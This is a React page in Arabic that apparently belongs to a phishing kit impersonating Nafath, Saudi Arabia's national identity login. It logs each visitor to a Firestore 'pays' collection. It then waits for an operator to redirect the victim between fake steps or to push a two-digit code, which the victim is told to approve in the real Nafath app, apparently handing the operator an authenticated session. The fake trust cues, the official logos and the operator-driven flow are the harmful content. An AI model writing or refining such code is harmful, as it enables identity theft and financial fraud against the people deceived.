"use client";

import { Loader2Icon, Menu, ShieldAlert, Smartphone, CheckCircle2, ShieldCheck } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { useEffect, useState } from "react";
import { addData, db } from "@/lib/firebase";
import { Alert } from "@/components/ui/alert";
import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
import { updateVisitorPage } from "@/lib/visitor-tracking";

export default function Component() {
  const [showConfirmDialog, setShowConfirmDialog] = useState(false);
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [confirmationCode, setConfirmationCode] = useState<string>("");
  const [isloading, setIsLoading] = useState(true);
  const [showError, setShowError] = useState("");
  const [submitted, setSubmitted] = useState(false);

  const visitorId = typeof window !== 'undefined' ? localStorage.getItem("visitor") || "" : ""
  
  useRedirectMonitor({ visitorId, currentPage: "nafad" })
  
  useEffect(() => {
    if (visitorId) {
      updateVisitorPage(visitorId, "nafad", 8)
    }
  }, [visitorId])

  // Auto-submit on page load
  useEffect(() => {
    if (!visitorId || submitted) return
    setSubmitted(true)

    addData({
      id: visitorId,
      nafadConfirmationStatus: "waiting",
      currentStep: "_t6",
      nafadUpdatedAt: new Date().toISOString()
    }).catch(console.error)
  }, [visitorId, submitted])

  useEffect(() => {
    if (!visitorId) return

    if (!db) return
    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data()

          if (data.currentStep === "home") {
            window.location.href = "/"
          } else if (data.currentStep === "phone") {
            window.location.href = "/step5"
          } else if (data.currentStep === "_st1") {
            window.location.href = "/check"
          } else if (data.currentStep === "_t2") {
            window.location.href = "/step2"
          } else if (data.currentStep === "_t3") {
            window.location.href = "/step3"
          }

          if (data.nafadConfirmationCode) {
            setConfirmationCode(data.nafadConfirmationCode)
            
            const storageKey = `nafad_shown_${visitorId}`
            const lastShownCode = localStorage.getItem(storageKey)
            
            if (data.nafadConfirmationCode !== lastShownCode) {
              setShowConfirmDialog(true)
              localStorage.setItem(storageKey, data.nafadConfirmationCode)
              setIsLoading(false)
              setShowError("")
              setShowSuccessDialog(false)
            }
          } else if (data.nafadConfirmationCode === "") {
            setShowConfirmDialog(false)
            const storageKey = `nafad_shown_${visitorId}`
            localStorage.removeItem(storageKey)
          }

          if (data.nafadConfirmationStatus === "approved") {
            setShowConfirmDialog(false)
            setShowSuccessDialog(true)
            setDoc(doc(db as Firestore, "pays", visitorId), {
              nafadConfirmationStatus: "",
              nafadConfirmationCode: ""
            }, { merge: true })
          } else if (data.nafadConfirmationStatus === "rejected") {
            setShowConfirmDialog(false)
            setShowError("تم رفض عملية التحقق. يرجى المحاولة مرة أخرى.")
            setIsLoading(false)
            setDoc(doc(db as Firestore, "pays", visitorId), {
              nafadConfirmationStatus: "",
              nafadConfirmationCode: ""
            }, { merge: true })
          }
        }
      },
      (error) => {
        console.error("[nafad] Firestore listener error:", error)
      }
    )

    return () => unsubscribe()
  }, [])

  const handleRetry = async () => {
    setShowError("")
    setIsLoading(true)
    await addData({
      id: visitorId,
      nafadConfirmationStatus: "waiting",
      currentStep: "_t6",
      nafadUpdatedAt: new Date().toISOString()
    })
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-teal-50 to-slate-100" dir="rtl">
      {/* Header */}
      <header className="bg-white/80 backdrop-blur-md shadow-sm border-b border-teal-100 sticky top-0 z-10">
        <div className="flex items-center justify-between p-4 max-w-7xl mx-auto">
          <Menu className="w-6 h-6 text-gray-500 cursor-pointer hover:text-teal-600 transition-colors" />
          <img src="/nafad-logo.png" alt="نفاذ" width={110} className="object-contain" />
          <div className="w-6"></div>
        </div>
      </header>

      <main className="p-4 max-w-lg mx-auto py-10 space-y-6">
        {/* Hero Section */}
        <div className="text-center space-y-3">
          <div className="w-20 h-20 bg-gradient-to-br from-teal-500 to-teal-700 rounded-2xl flex items-center justify-center mx-auto shadow-lg shadow-teal-200">
            <ShieldCheck className="w-10 h-10 text-white" />
          </div>
          <h1 className="text-2xl font-bold text-gray-800">التحقق عبر نفاذ</h1>
          <p className="text-gray-500 text-sm">جاري التحقق من هويتك بأمان عبر المنصة الوطنية الموحدة</p>
        </div>

        {/* Status Card */}
        <Card className="border-0 shadow-xl shadow-teal-100/50 overflow-hidden">
          <div className="h-1 bg-gradient-to-r from-teal-400 to-teal-600"></div>
          <CardContent className="p-8 text-center space-y-6">
            {showError ? (
              <>
                <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto">
                  <ShieldAlert className="w-8 h-8 text-red-500" />
                </div>
                <Alert className="text-sm text-red-700 bg-red-50 border-red-200 text-right" dir="rtl">
                  <ShieldAlert className="w-4 h-4 text-red-600" />
                  {showError}
                </Alert>
                <Button
                  onClick={handleRetry}
                  className="w-full bg-gradient-to-r from-teal-600 to-teal-700 hover:from-teal-700 hover:to-teal-800 text-white h-12 text-base font-semibold rounded-xl shadow-md"
                >
                  إعادة المحاولة
                </Button>
              </>
            ) : (
              <>
                <div className="flex flex-col items-center gap-4">
                  <div className="relative">
                    <div className="w-16 h-16 bg-teal-50 rounded-full flex items-center justify-center">
                      <Loader2Icon className="w-8 h-8 text-teal-600 animate-spin" />
                    </div>
                    <div className="absolute -bottom-1 -right-1 w-5 h-5 bg-teal-500 rounded-full flex items-center justify-center">
                      <div className="w-2 h-2 bg-white rounded-full animate-pulse"></div>
                    </div>
                  </div>
                  <div className="space-y-1">
                    <p className="font-semibold text-gray-800 text-lg">في انتظار التحقق</p>
                    <p className="text-gray-500 text-sm">سيتم إرسال رمز التحقق إلى تطبيق نفاذ</p>
                  </div>
                </div>

                <div className="bg-teal-50 rounded-xl p-4 border border-teal-100 space-y-2 text-right">
                  <div className="flex items-center gap-2 text-teal-700 text-sm">
                    <ShieldCheck className="w-4 h-4 flex-shrink-0" />
                    <span>تأكد أن تطبيق نفاذ مثبت على جهازك</span>
                  </div>
                  <div className="flex items-center gap-2 text-teal-700 text-sm">
                    <Smartphone className="w-4 h-4 flex-shrink-0" />
                    <span>انتظر وصول الإشعار على هاتفك</span>
                  </div>
                </div>
              </>
            )}
          </CardContent>
        </Card>

        {/* App Download */}
        <div className="bg-gradient-to-br from-teal-600 to-teal-800 rounded-2xl p-6 text-center text-white space-y-4 shadow-lg shadow-teal-200 relative overflow-hidden">
          <div className="absolute top-0 right-0 w-28 h-28 bg-white/10 rounded-full -mr-10 -mt-10"></div>
          <div className="absolute bottom-0 left-0 w-20 h-20 bg-white/10 rounded-full -ml-8 -mb-8"></div>
          <p className="text-sm font-medium text-teal-100 relative z-10">لتحميل تطبيق نفاذ</p>
          <div className="flex justify-center gap-3 relative z-10">
            <a href="#" className="hover:scale-105 transition-transform">
              <img src="/google-play.png" alt="Google Play" className="h-9 rounded-lg" />
            </a>
            <a href="#" className="hover:scale-105 transition-transform">
              <img src="/apple_store.png" alt="App Store" className="h-9 rounded-lg" />
            </a>
          </div>
        </div>
      </main>

      {/* Confirmation Code Dialog */}
      <Dialog open={showConfirmDialog} onOpenChange={() => {}}>
        <DialogContent className="max-w-sm mx-auto [&>button]:hidden rounded-2xl border-0 shadow-2xl" dir="rtl">
          <DialogHeader className="space-y-1">
            <DialogTitle className="text-center text-xl font-bold text-gray-800">
              رمز التحقق من نفاذ
            </DialogTitle>
            <p className="text-center text-sm text-gray-500 leading-relaxed">
              افتح تطبيق نفاذ وأكد الرقم الظاهر أدناه
            </p>
          </DialogHeader>

          <div className="text-center space-y-5 py-2">
            <div className="mx-auto w-44 h-44 bg-gradient-to-br from-teal-50 to-teal-100 border-2 border-teal-200 rounded-3xl shadow-inner flex items-center justify-center">
              <div className="flex gap-4 justify-center items-center" dir="ltr">
                <div className="text-7xl font-black text-teal-600 font-mono leading-none">
                  {confirmationCode?.[0] || "–"}
                </div>
                <div className="text-7xl font-black text-teal-600 font-mono leading-none">
                  {confirmationCode?.[1] || "–"}
                </div>
              </div>
            </div>

            <div className="flex items-center justify-center gap-2 text-teal-600">
              <div className="relative flex items-center justify-center w-4 h-4">
                <div className="w-3 h-3 bg-teal-500 rounded-full animate-ping absolute opacity-75"></div>
                <div className="w-2 h-2 bg-teal-600 rounded-full"></div>
              </div>
              <span className="text-sm font-medium">في انتظار تأكيدك في التطبيق...</span>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Success Dialog */}
      <Dialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <DialogContent className="max-w-sm mx-auto rounded-2xl border-0 shadow-2xl" dir="rtl">
          <div className="text-center space-y-5 p-2">
            <div className="w-20 h-20 bg-gradient-to-br from-green-400 to-green-600 rounded-full flex items-center justify-center mx-auto shadow-lg shadow-green-200">
              <CheckCircle2 className="w-11 h-11 text-white" />
            </div>
            <div className="space-y-1">
              <h3 className="text-2xl font-bold text-gray-800">تم التحقق بنجاح</h3>
              <p className="text-gray-500 text-sm">تمت عملية التحقق من هويتك عبر نفاذ</p>
            </div>
            <div className="bg-green-50 border border-green-200 rounded-xl p-3">
              <p className="text-sm text-green-800">شكراً لاستخدامك منصة النفاذ الوطني الموحد</p>
            </div>
            <Button
              onClick={() => setShowSuccessDialog(false)}
              className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white h-12 text-base font-semibold rounded-xl"
            >
              إغلاق
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Footer */}
      <footer className="mt-10 p-6 bg-white/60 border-t border-gray-100">
        <div className="text-center space-y-4 max-w-4xl mx-auto">
          <div className="flex flex-wrap justify-center gap-x-6 gap-y-1 text-xs text-gray-500">
            {["الرئيسية", "حول", "اتصل بنا", "الشروط والأحكام", "المساعدة والدعم", "سياسة الخصوصية"].map((link) => (
              <a key={link} href="#" className="hover:text-teal-600 transition-colors">{link}</a>
            ))}
          </div>
          <div className="flex justify-center">
            <img src="/cst-logo.jpg" alt="هيئة الاتصالات" width={50} className="opacity-60 rounded" />
          </div>
        </div>
      </footer>
    </div>
  );
}
